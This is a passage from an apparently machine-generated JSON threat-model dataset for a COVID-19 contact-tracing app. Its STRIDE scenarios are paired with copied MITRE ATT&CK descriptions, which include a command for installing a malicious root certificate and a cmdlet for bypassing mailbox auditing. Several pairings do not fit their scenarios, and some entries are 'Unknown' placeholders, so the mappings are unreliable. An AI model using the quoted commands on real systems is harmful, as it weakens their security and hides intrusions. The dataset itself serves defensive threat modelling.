Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could intercept data during transmission to the centralized server and modify the contents.",
            "Assumptions": [
                {
                    "Assumption": "Data in transit is not encrypted.",
                    "Role": "System Architect",
                    "Condition": "Lack of transport layer security."
                },
                {
                    "Assumption": "Attackers have access to network traffic.",
                    "Role": "Attacker",
                    "Condition": "Network proximity to target users."
                },
                {
                    "Assumption": "The system does not verify data integrity on reception.",
                    "Role": "System Designer",
                    "Condition": "Absence of integrity checks."
                }
            ],
            "Potential Impact": "Corruption or tampering of data during transmission.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "network interception",
                "data alteration"
            ],
            "mitre_technique": {
                "name": "File/Path Exclusions",
                "description": "Adversaries may attempt to hide their file-based artifacts by writing them to specific folders or file names excluded from antivirus (AV) scanning and other defensive capabilities. AV and other file-based scanners often include exclusions to optimize performance as well as ease installation and legitimate use of applications. These exclusions may be contextual (e.g., scans are only initiated in response to specific triggering events/alerts), but are also often hardcoded strings referencing specific folders and/or files assumed to be trusted and legitimate.(Citation: Microsoft File Folder Exclusions)\n\nAdversaries may abuse these exclusions to hide their file-based artifacts. For example, rather than  tampering with tool settings to add a new exclusion (i.e., [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)), adversaries may drop their file-based payloads in default or otherwise well-known exclusions. Adversaries may also use [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) and other [Discovery](https://attack.mitre.org/tactics/TA0007)/[Reconnaissance](https://attack.mitre.org/tactics/TA0043) activities to both discover and verify existing exclusions in a victim environment.",
                "id": "attack-pattern--09b008a9-b4eb-462a-a751-a0eb58050cd9",
                "technique_id": "T1564.012"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could modify log files that store operation metadata to hide malicious activities.",
            "Assumptions": [
                {
                    "Assumption": "Log files are stored locally without protection.",
                    "Role": "System Administrator",
                    "Condition": "Insufficient log file security."
                },
                {
                    "Assumption": "Attackers have access to the file system.",
                    "Role": "Attacker",
                    "Condition": "Device compromised through malware or other means."
                },
                {
                    "Assumption": "The system does not track changes to log files.",
                    "Role": "System Designer",
                    "Condition": "Lack of log file tampering detection."
                }
            ],
            "Potential Impact": "Tampering with operational records and obfuscation of attacks.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "log file",
                "evidence hiding"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Cloud Logs",
                "description": "An adversary may disable or modify cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable or modify logging to avoid detection of their activities.\n\nFor example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity.(Citation: Following the CloudTrail: Generating strong AWS security signals with Sumo Logic) They may alternatively tamper with logging functionality \u2013 for example, by removing any associated SNS topics, disabling multi-region logging, or disabling settings that validate and/or encrypt log files.(Citation: AWS Update Trail)(Citation: Pacu Detection Disruption Module) In Office 365, an adversary may disable logging on mail collection activities for specific users by using the `Set-MailboxAuditBypassAssociation` cmdlet, by disabling M365 Advanced Auditing for the user, or by downgrading the user\u2019s license from an Enterprise E5 to an Enterprise E3 license.(Citation: Dark Reading Microsoft 365 Attacks 2021)",
                "id": "attack-pattern--cacc40da-4c9e-462c-80d5-fd70a178b12d",
                "technique_id": "T1562.008"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user might deny having shared data due to lack of proper logging and non-repudiation controls.",
            "Assumptions": [
                {
                    "Assumption": "The system does not implement non-repudiation mechanisms.",
                    "Role": "System Architect",
                    "Condition": "Lack of non-repudiation features."
                },
                {
                    "Assumption": "Users can manipulate or delete logs on their devices.",
                    "Role": "End-user",
                    "Condition": "Inadequate local log protection."
                },
                {
                    "Assumption": "Audit trails are not securely maintained.",
                    "Role": "System Administrator",
                    "Condition": "Insufficient audit trail security."
                }
            ],
            "Potential Impact": "Discrepancies in data accountability and traceability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "denial of actions",
                "log manipulation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker could manipulate network traffic to generate false logs, making it difficult to trace their actions.",
            "Assumptions": [
                {
                    "Assumption": "The network lacks robust monitoring and logging mechanisms.",
                    "Role": "Network Administrator",
                    "Condition": "Inefficient network monitoring."
                },
                {
                    "Assumption": "Attackers have the ability to intercept and alter traffic.",
                    "Role": "Attacker",
                    "Condition": "Access to the network."
                },
                {
                    "Assumption": "System does not correlate logs from multiple sources.",
                    "Role": "System Designer",
                    "Condition": "Lack of centralized log correlation."
                }
            ],
            "Potential Impact": "Tampering with evidence and undermining incident investigations.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "network traffic manipulation",
                "log falsification"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user could deny having received exposure notifications because logs of notification deliveries are not securely maintained.",
            "Assumptions": [
                {
                    "Assumption": "Notification logs are not securely stored or transmitted.",
                    "Role": "System Designer",
                    "Condition": "Unprotected logging mechanisms."
                },
                {
                    "Assumption": "Users can delete or alter local notification records.",
                    "Role": "End-user",
                    "Condition": "Control over local data."
                },
                {
                    "Assumption": "The system does not validate notification deliveries.",
                    "Role": "System Architect",
                    "Condition": "Lack of delivery confirmation mechanisms."
                }
            ],
            "Potential Impact": "Loss of notification accountability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "notification denial",
                "log alteration"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker might intercept unencrypted Bluetooth or GPS communications to gather sensitive data about users' locations and contacts.",
            "Assumptions": [
                {
                    "Assumption": "Bluetooth/GPS data is transmitted without encryption.",
                    "Role": "System Architect",
                    "Condition": "Unencrypted data transmission."
                },
                {
                    "Assumption": "Attackers can easily access device communications.",
                    "Role": "Attacker",
                    "Condition": "Physical or digital proximity."
                },
                {
                    "Assumption": "The system does not use secure communication protocols.",
                    "Role": "System Designer",
                    "Condition": "Lack of communication security."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive user data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data interception",
                "Bluetooth",
                "GPS"
            ],
            "mitre_technique": {
                "name": "Exfiltration Over Bluetooth",
                "description": "Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel.\n\nAdversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",
                "id": "attack-pattern--613d08bc-e8f4-4791-80b0-c8b974340dfd",
                "technique_id": "T1011.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A breach in the central server could expose a vast amount of accumulated sensitive health data.",
            "Assumptions": [
                {
                    "Assumption": "The central server has vulnerabilities that can be exploited.",
                    "Role": "System Administrator",
                    "Condition": "Undiscovered or unpatched vulnerabilities."
                },
                {
                    "Assumption": "Users assume the central server is secure.",
                    "Role": "End-user",
                    "Condition": "Trust in system security."
                },
                {
                    "Assumption": "No advanced monitoring or intrusion detection systems are in place.",
                    "Role": "System Designer",
                    "Condition": "Lack of advanced security measures."
                }
            ],
            "Potential Impact": "Mass unauthorized disclosure of sensitive health information.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "server breach",
                "health data"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Malware introduced via phishing attacks could lead to unauthorized access to sensitive data stored on user devices.",
            "Assumptions": [
                {
                    "Assumption": "Users may fall for phishing attacks.",
                    "Role": "End-user",
                    "Condition": "Lack of user awareness."
                },
                {
                    "Assumption": "No effective anti-malware solutions on user devices.",
                    "Role": "System Administrator",
                    "Condition": "Absence of endpoint protection."
                },
                {
                    "Assumption": "Attacker has crafted a convincing phishing attack.",
                    "Role": "Attacker",
                    "Condition": "Proficiency in social engineering."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive user data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "phishing",
                "malware",
                "data access"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker might launch a DDoS attack against the central server, disrupting the service and preventing exposure notifications.",
            "Assumptions": [
                {
                    "Assumption": "The central server is exposed to the internet.",
                    "Role": "System Architect",
                    "Condition": "Internet-facing server."
                },
                {
                    "Assumption": "The server lacks adequate DDoS protection.",
                    "Role": "System Administrator",
                    "Condition": "Insufficient DDoS mitigation."
                },
                {
                    "Assumption": "Attackers have access to botnets or other DDoS tools.",
                    "Role": "Attacker",
                    "Condition": "Availability of attack tools."
                }
            ],
            "Potential Impact": "Service disruption and unavailability of critical functionalities.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "server",
                "disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A malicious app update could contain a bug that causes the application to crash, rendering it unusable.",
            "Assumptions": [
                {
                    "Assumption": "Automated updates are not thoroughly tested.",
                    "Role": "Development Team",
                    "Condition": "Inadequate testing procedures."
                },
                {
                    "Assumption": "Users automatically install updates.",
                    "Role": "End-user",
                    "Condition": "Automatic update feature enabled."
                },
                {
                    "Assumption": "Malicious or faulty code can be introduced into updates.",
                    "Role": "Attacker or Development Team",
                    "Condition": "Weak code auditing."
                }
            ],
            "Potential Impact": "Application unavailability and loss of functionality.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "bug",
                "update",
                "application crash"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker might exploit system vulnerabilities to send malformed data packets, causing the application to crash or behave unpredictably.",
            "Assumptions": [
                {
                    "Assumption": "The system has unpatched vulnerabilities.",
                    "Role": "System Administrator",
                    "Condition": "Unpatched or unknown vulnerabilities."
                },
                {
                    "Assumption": "Attackers can exploit these vulnerabilities remotely.",
                    "Role": "Attacker",
                    "Condition": "Remote access capabilities."
                },
                {
                    "Assumption": "The application does not handle malformed data gracefully.",
                    "Role": "System Designer",
                    "Condition": "Lack of robust error handling."
                }
            ],
            "Potential Impact": "Application crash and service disruption.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "vulnerability",
                "malformed data",
                "crash"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker could exploit an unprivileged account to gain administrative access via unpatched vulnerabilities.",
            "Assumptions": [
                {
                    "Assumption": "Unprivileged accounts can access vulnerable components.",
                    "Role": "System Architect",
                    "Condition": "Poor access control."
                },
                {
                    "Assumption": "The system has known (but unpatched) vulnerabilities.",
                    "Role": "System Administrator",
                    "Condition": "Delays in patching."
                },
                {
                    "Assumption": "Attackers have knowledge of these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Up-to-date threat intelligence."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data and critical functionalities.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "vulnerability",
                "unpatched",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "Group Policy Discovery",
                "description": "Adversaries may gather information on Group Policy settings to identify paths for privilege escalation, security measures applied within a domain, and to discover patterns in domain objects that can be manipulated or used to blend in the environment. Group Policy allows for centralized management of user and computer settings in Active Directory (AD). Group policy objects (GPOs) are containers for group policy settings made up of files stored within a predictable network path `\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\`.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016)\n\nAdversaries may use commands such as <code>gpresult</code> or various publicly available PowerShell functions, such as <code>Get-DomainGPO</code> and <code>Get-DomainGPOLocalGroup</code>, to gather information on Group Policy settings.(Citation: Microsoft gpresult)(Citation: Github PowerShell Empire) Adversaries may use this information to shape follow-on behaviors, including determining potential attack paths within the target network as well as opportunities to manipulate Group Policy settings (i.e. [Domain or Tenant Policy Modification](https://attack.mitre.org/techniques/T1484)) for their benefit.",
                "id": "attack-pattern--1b20efbf-8063-4fc3-a07d-b575318a301b",
                "technique_id": "T1615"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker could insert malicious code into the mobile application through a supply chain attack, gaining elevated privileges.",
            "Assumptions": [
                {
                    "Assumption": "The app development process lacks security checks.",
                    "Role": "Development Team",
                    "Condition": "Weak supply chain security."
                },
                {
                    "Assumption": "The malicious code goes unnoticed during audits.",
                    "Role": "Quality Assurance",
                    "Condition": "Ineffective code reviews."
                },
                {
                    "Assumption": "Users will download and install the compromised app.",
                    "Role": "End-user",
                    "Condition": "Trust in the app source."
                }
            ],
            "Potential Impact": "Unauthorized access with elevated privileges.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "supply chain attack",
                "malicious code",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "Compromise Software Dependencies and Development Tools",
                "description": "Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)  \n\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims. ",
                "id": "attack-pattern--191cc6af-1bb2-4344-ab5f-28e496638720",
                "technique_id": "T1195.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker could leverage a buffer overflow vulnerability in the application to execute arbitrary code with elevated privileges.",
            "Assumptions": [
                {
                    "Assumption": "The application has a buffer overflow vulnerability.",
                    "Role": "System Architect",
                    "Condition": "Presence of coding errors."
                },
                {
                    "Assumption": "Attackers can provide specially crafted inputs.",
                    "Role": "Attacker",
                    "Condition": "Ability to interact with application."
                },
                {
                    "Assumption": "The system does not employ adequate runtime protections.",
                    "Role": "System Designer",
                    "Condition": "Lack of security mechanisms."
                }
            ],
            "Potential Impact": "Arbitrary code execution with elevated privileges.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "buffer overflow",
                "code execution",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "AppInit DLLs",
                "description": "Dynamic-link libraries (DLLs) that are specified in the AppInit_DLLs value in the Registry keys <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> or <code>HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. (Citation: Elastic Process Injection July 2017) Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), these values can be abused to obtain persistence and privilege escalation by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. (Citation: AppInit Registry)\n\nThe AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled. (Citation: AppInit Secure Boot)",
                "id": "attack-pattern--317fefa6-46c7-4062-adb6-2008cf6bcb41",
                "technique_id": "T1103"
            }
        }
    ]
},
{
    "case_number": "10",
    "batch_number": "21",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a legitimate user device to send false COVID-19 exposure alerts.",
            "Assumptions": [
                {
                    "Assumption": "Attacker can access user device credentials or spoof device identity",
                    "Role": "Attacker",
                    "Condition": "Attacker has physical access to a compromised device or can intercept communications"
                },
                {
                    "Assumption": "Central server does not verify the authenticity of the device IDs",
                    "Role": "System",
                    "Condition": "No mutual authentication between server and device"
                },
                {
                    "Assumption": "User devices accept exposure notifications without verifying the source",
                    "Role": "User Device",
                    "Condition": "Device software does not validate alerts"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive data, disruption of service",
            "MITRE ATT&CK Keywords": [
                "Credential Access",
                "Impersonation",
                "Network Spoofing"
            ],
            "mitre_technique": {
                "name": "Impersonation",
                "description": "Adversaries may impersonate a trusted person or organization in order to persuade and trick a target into performing some action on their behalf. For example, adversaries may communicate with victims (via [Phishing for Information](https://attack.mitre.org/techniques/T1598), [Phishing](https://attack.mitre.org/techniques/T1566), or [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)) while impersonating a known sender such as an executive, colleague, or third-party vendor. Established trust can then be leveraged to accomplish an adversary\u2019s ultimate goals, possibly against multiple victims. \n \nIn many cases of business email compromise or email fraud campaigns, adversaries use impersonation to defraud victims -- deceiving them into sending money or divulging information that ultimately enables [Financial Theft](https://attack.mitre.org/techniques/T1657).\n\nAdversaries will often also use social engineering techniques such as manipulative and persuasive language in email subject lines and body text such as `payment`, `request`, or `urgent` to push the victim to act quickly before malicious activity is detected. These campaigns are often specifically targeted against people who, due to job roles and/or accesses, can carry out the adversary\u2019s goal.\u202f\u202f \n \nImpersonation is typically preceded by reconnaissance techniques such as [Gather Victim Identity Information](https://attack.mitre.org/techniques/T1589) and [Gather Victim Org Information](https://attack.mitre.org/techniques/T1591) as well as acquiring infrastructure such as email domains (i.e. [Domains](https://attack.mitre.org/techniques/T1583/001)) to substantiate their false identity.(Citation: CrowdStrike-BEC)\n \nThere is the potential for multiple victims in campaigns involving impersonation. For example, an adversary may [Compromise Accounts](https://attack.mitre.org/techniques/T1586) targeting one organization which can then be used to support impersonation against other entities.(Citation: VEC)",
                "id": "attack-pattern--c9e0c59e-162e-40a4-b8b1-78fab4329ada",
                "technique_id": "T1656"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Attacker spoofs GPS/Bluetooth signals to manipulate proximity data.",
            "Assumptions": [
                {
                    "Assumption": "Devices rely on local signal data without cross-referencing",
                    "Role": "User Device",
                    "Condition": "GPS or Bluetooth data are not validated against other sources"
                },
                {
                    "Assumption": "Attacker can generate signals that mimic legitimate devices",
                    "Role": "Attacker",
                    "Condition": "Attacker has necessary equipment and knowledge"
                },
                {
                    "Assumption": "Proximity data not encrypted securely",
                    "Role": "System",
                    "Condition": "Data integrity measures not in place"
                }
            ],
            "Potential Impact": "Corruption of data, unauthorized data manipulation",
            "MITRE ATT&CK Keywords": [
                "Signal Spoofing",
                "Data Manipulation",
                "Proximity Spoofing"
            ],
            "mitre_technique": {
                "name": "Transmitted Data Manipulation",
                "description": "Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nManipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--cc1e737c-236c-4e3b-83ba-32039a626ef8",
                "technique_id": "T1493"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Phishing attack leads to users installing malicious version of the app.",
            "Assumptions": [
                {
                    "Assumption": "Users are susceptible to phishing links",
                    "Role": "User",
                    "Condition": "Users are not trained to recognize phishing"
                },
                {
                    "Assumption": "App stores do not vet apps thoroughly",
                    "Role": "App Store",
                    "Condition": "Weak app store security policies"
                },
                {
                    "Assumption": "Malicious app mimics legitimate app functionality",
                    "Role": "Attacker",
                    "Condition": "High attacker capability in app development"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive data, device compromise",
            "MITRE ATT&CK Keywords": [
                "Phishing",
                "Malicious Code",
                "Credential Phishing"
            ],
            "mitre_technique": {
                "name": "Spearphishing Link",
                "description": "Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)",
                "id": "attack-pattern--20138b9d-1aac-4a26-8654-a36b6bbf2bba",
                "technique_id": "T1192"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Attacker intercepts and modifies data being sent from user devices to the server.",
            "Assumptions": [
                {
                    "Assumption": "Data transmission is not encrypted",
                    "Role": "System",
                    "Condition": "Lack of encryption protocols"
                },
                {
                    "Assumption": "Attacker can perform man-in-the-middle attacks",
                    "Role": "Attacker",
                    "Condition": "Attacker has network access"
                },
                {
                    "Assumption": "Client-server communications are not authenticated",
                    "Role": "System",
                    "Condition": "No mutual authentication mechanisms"
                }
            ],
            "Potential Impact": "Data integrity loss, unauthorized data manipulation",
            "MITRE ATT&CK Keywords": [
                "Man-in-the-Middle",
                "Data Tampering",
                "Transmission Interception"
            ],
            "mitre_technique": {
                "name": "Install Root Certificate",
                "description": "Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. (Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\n\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. (Citation: Operation Emmental)\n\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS/SSL communications. (Citation: Kaspersky Superfish)\n\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence. (Citation: SpectorOps Code Signing Dec 2017)\n\nIn macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain. (Citation: objective-see ay mami 2018)",
                "id": "attack-pattern--d519cfd5-f3a8-43a9-a846-ed0bb40672b1",
                "technique_id": "T1130"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malware on user devices alters proximity data before it is uploaded.",
            "Assumptions": [
                {
                    "Assumption": "User devices are vulnerable to malware",
                    "Role": "User Device",
                    "Condition": "Devices lack security patches or antivirus"
                },
                {
                    "Assumption": "Malware can use device privileges",
                    "Role": "Malware",
                    "Condition": "Malware has been granted necessary permissions"
                },
                {
                    "Assumption": "Proximity data is stored unencrypted",
                    "Role": "System",
                    "Condition": "No encryption at rest"
                }
            ],
            "Potential Impact": "Data integrity loss, corruption of tracked data",
            "MITRE ATT&CK Keywords": [
                "Malware",
                "Data Tampering",
                "Device Compromise"
            ],
            "mitre_technique": {
                "name": "Screen Capture",
                "description": "Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.(Citation: CopyFromScreen .NET)(Citation: Antiquated Mac Malware)\n",
                "id": "attack-pattern--0259baeb-9f63-4c69-bf10-eb038c390688",
                "technique_id": "T1113"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Insider threat modifies server-side data to change exposure notifications.",
